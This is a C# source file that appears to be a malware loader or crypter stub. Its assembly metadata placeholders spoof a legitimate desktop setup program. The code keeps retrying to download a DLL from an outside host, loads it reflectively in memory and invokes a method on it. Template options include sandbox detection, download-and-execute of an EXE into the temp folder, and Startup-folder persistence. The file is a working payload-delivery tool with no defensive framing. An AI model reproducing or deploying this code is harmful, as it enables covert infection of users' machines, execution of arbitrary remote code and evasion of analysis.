using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;

//Default [assembly: AssemblyDescription("TCX Desktop Setup")]
//Default [assembly: AssemblyCompany("TCX FZ-LLC")]
//Default [assembly: AssemblyProduct("TCX Desktopr")]
//Default [assembly: AssemblyFileVersion("4.3.4.0")]


//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]


namespace Khontkar
{
    static class Program
    {

        public static byte[] RedKeys(string harbi)
        {
            byte[] RedKeys;
            for (; ; )
            {
                try
                {
                    WebClient telefon = new WebClient();
                    RedKeys = telefon.DownloadData(harbi);
                }
                catch (Exception ex)
                {
                    continue;
                }
                break;
            }
            return RedKeys;
        }

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {



            //sandboxie controlsandboxie();

            //Messega


            //download try
            //download {
            //download  System.Net.WebClient appyrun = new System.Net.WebClient();
            //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
            //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
            //download }
            //download catch
            //download {
            //download }


            object audio = new object[] { %aPP%, string.Empty, RedKeys("%Server%"), true };

            
            {
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            }


            Assembly Flow;

            Flow = AppDomain.CurrentDomain.Load(RedKeys("https://ieaspk.com/instagram.dll"));


            Flow.GetType("instagram.whatsapp").InvokeMember("studio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])audio);

            //start  {
            //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
            //start  }


        }

        //sandboxie [DllImport("kernel32.dll")]
        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
        //sandboxie static void controlsandboxie()
        //sandboxie {
        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
        //sandboxie     {
        //sandboxie        Environment.Exit(1);
        //sandboxie     }
        //sandboxie }
    }
}
